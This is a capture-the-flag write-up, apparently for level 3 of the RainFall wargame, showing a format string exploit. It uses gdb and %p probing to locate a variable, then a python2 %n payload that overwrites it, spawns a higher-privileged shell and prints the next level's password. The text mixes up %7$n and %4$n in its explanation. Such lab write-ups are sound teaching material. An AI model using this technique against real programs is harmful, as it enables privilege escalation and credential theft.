# Level 3

This program is vulnerable to format string since the printf function is used to print the buffer without specifying a format string. We can use the format string to overwrite the value of m to 64 and spawn a shell, we can use the %n format specifier, here is what it does according to the manual:

```
The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.
```

Basically, it means that %n will write the size of our input at the address pointed by %n

Let's find the address to the m variable:

```bash
level3@RainFall:~$ gdb -q level3 
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x804988c
(gdb) 
```

We have the address of the variable

```bash
level3@RainFall:~$ ./level3 
AAAA %p %p %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025
```

Now we can see that the buffer is the 4th argument on the stack, so we can use the %4$p format specifier to print the value of the buffer:


```bash
level3@RainFall:~$ ./level3 
AAAA %4$p
AAAA 0x41414141
```

Now we can use the `%n` format specifier to write the value 64 to the address of the `m` variable. To achieve this, we need to write 64 characters to the buffer first, using the format `AAAA%<value-4>x%7$n` (where `value-4` is the number of bytes already written, in this case 4 for "AAAA"). For example, `AAAA%96x%7$n` will write the value 100 at the address 0x41414141. This is because `%100x` will print the argument padded with 100 bytes (using spaces as padding).


```bash
level3@RainFall:~$ python2 -c "print '\x8c\x98\x04\x08' + '%60x' + '%4\$n'" > /tmp/exploit2
level3@RainFall:~$ cat /tmp/exploit2 - | ./level3 
�                                                         200
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cd /home/user/level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```


